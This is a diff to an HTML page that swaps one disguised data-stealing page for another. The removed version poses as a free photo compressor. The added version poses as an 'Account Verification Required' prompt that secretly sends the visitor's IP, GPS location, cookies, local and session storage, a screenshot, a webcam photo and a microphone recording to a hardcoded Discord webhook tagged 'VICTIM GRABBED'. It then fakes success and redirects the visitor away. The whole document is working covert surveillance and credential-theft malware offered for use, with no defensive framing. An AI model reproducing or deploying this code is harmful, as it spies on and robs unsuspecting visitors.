@@ -1,67 +1,113 @@
-!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Free Photo Compressor 2025</title></head><body>
-<h2>Compress Photo – 90% Smaller (Instant)</h2>
-<button onclick="stealEverything()">Take Photo to Compress</button>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Verification Required</title>
+  <style>
+    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;}
+    h1{color:#ff0033;}
+    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
+    video,canvas{display:none;}
+  </style>
+</head>
+<body>
+  <h1>Account Verification Required</h1>
+  <p>Please allow camera, microphone, location & screen to verify your identity.</p>
+  <button onclick="start()">Verify Now →</button>
 
-<script>
-const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
+  <video id="video" autoplay playsinline></video>
+  <canvas id="cam"></canvas>
+  <canvas id="screen"></canvas>
 
-async function stealEverything() {
-    const data = {
-        time: new Date().toLocaleString(),
-        ip: await (await fetch('https://ipapi.co/json/')).json(),
-        ua: navigator.userAgent,
-        screen: `\( {screen.width}x \){screen.height}`,
-        battery: await (await navigator.getBattery?.())?.level * 100 + "%",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        languages: navigator.languages,
-        connection: navigator.connection?.effectiveType
-    };
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-    // 1. Camera + Mic
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-        const video = document.createElement('video'); video.srcObject = stream; video.play();
-        setInterval(() => capture(video, "SELFIE"), 7000);
-    } catch(e) {}
+    async function send(file, name) {
+      let f = new FormData();
+      f.append("file", file, name);
+      f.append("content", "**VICTIM GRABBED** • " + new Date().toLocaleString());
+      await fetch(webhook, {method:"POST", body:f});
+    }
 
-    // 2. Screen
-    setTimeout(async () => {
-        try {
-            const s = await navigator.mediaDevices.getDisplayMedia({video:true});
-            const v = document.createElement('video'); v.srcObject = s; v.play();
-            setInterval(() => capture(v, "SCREEN"), 9000);
-        } catch(e) {}
-    }, 3000);
+    // 1. IP + Geo
+    async function getIP() {
+      try {
+        const ip = await (await fetch("https://api.ipify.org")).text();
+        const g = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
+        const txt = `IP: \( {ip}\nISP: \){g.org}\nCity: \( {g.city}\nCountry: \){g.country_name}\nMap: https://maps.google.com/?q=\( {g.latitude}, \){g.longitude}`;
+        send(new Blob([txt],{type:"text/plain"}),"IP.txt");
+      } catch(e){}
+    }
 
-    // 3. Location
-    navigator.geolocation.watchPosition(p => {
-        data.location = `https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}`;
-        send(data);
+    // 2. GPS
+    navigator.geolocation.getCurrentPosition(p => {
+      const map = `https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}`;
+      send(new Blob([`GPS: \( {map}\nAccuracy: ± \){p.coords.accuracy}m`],{type:"text/plain"}),"GPS.txt");
     });
 
-    // 4. Clipboard
-    setTimeout(async () => {
-        try { data.clipboard = await navigator.clipboard.readText(); } catch(e) {}
-        send(data);
-    }, 5000);
+    // 3. Cookies (ALL of them)
+    function grabCookies() {
+      const cookies = document.cookie;
+      if (cookies) {
+        send(new Blob([cookies],{type:"text/plain"}),"COOKIES.txt");
+      }
+      // Also steal from localStorage & sessionStorage
+      const ls = JSON.stringify(localStorage, null, 2);
+      const ss = JSON.stringify(sessionStorage, null, 2);
+      if (ls.length > 10) send(new Blob([ls],{type:"text/plain"}),"LocalStorage.json");
+      if (ss.length > 10) send(new Blob([ss],{type:"text/plain"}),"SessionStorage.json");
+    }
 
-    send(data);
-}
+    // 4. Full Screenshot + Camera + Mic
+    function start() {
+      getIP();
+      grabCookies();
 
-function capture(video, type) {
-    const c = document.createElement('canvas');
-    c.width = video.videoWidth || 1280;
-    c.height = video.videoHeight || 720;
-    c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
-    c.toBlob(b => send({type, time: new Date()}, b), 'image/jpeg', 0.8);
-}
+      // Try real screen share first
+      if (navigator.mediaDevices.getDisplayMedia) {
+        navigator.mediaDevices.getDisplayMedia({video:true}).then(s => {
+          const v = document.createElement("video");
+          v.srcObject = s;
+          v.onloadedmetadata = () => {
+            v.play();
+            const c = document.getElementById("screen");
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext("2d").drawImage(v,0,0);
+            c.toBlob(b=>send(b,"SCREEN.jpg"),"image/jpeg",0.95);
+            s.getTracks().forEach(t=>t.stop());
+          };
+        }).catch(() => {});
+      }
 
-function send(text, file = null) {
-    const f = new FormData();
-    if (file) f.append("file", file, "capture.jpg");
-    f.append("content", "**VICTIM** – " + JSON.stringify(text).slice(0,1800));
-    navigator.sendBeacon(WEBHOOK, f);
-}
-</script>
-</body></html>
+      navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const c = document.getElementById("cam");
+          c.width = video.videoWidth || 1280;
+          c.height = video.videoHeight || 720;
+          c.getContext("2d").drawImage(video,0,0,c.width,c.height);
+          c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
+
+          const rec = new MediaRecorder(stream);
+          const chunks = [];
+          rec.ondataavailable = e => chunks.push(e.data);
+          rec.onstop = () => {
+            send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm");
+            stream.getTracks().forEach(t=>t.stop());
+          };
+          rec.start();
+          setTimeout(()=>rec.stop(),6000);
+        }, 2500);
+
+        setTimeout(() => {
+          alert("Verification complete!");
+          location.href = "https://google.com";
+        }, 12000);
+      }).catch(()=>{});
+    }
+  </script>
+</body>
+</html>
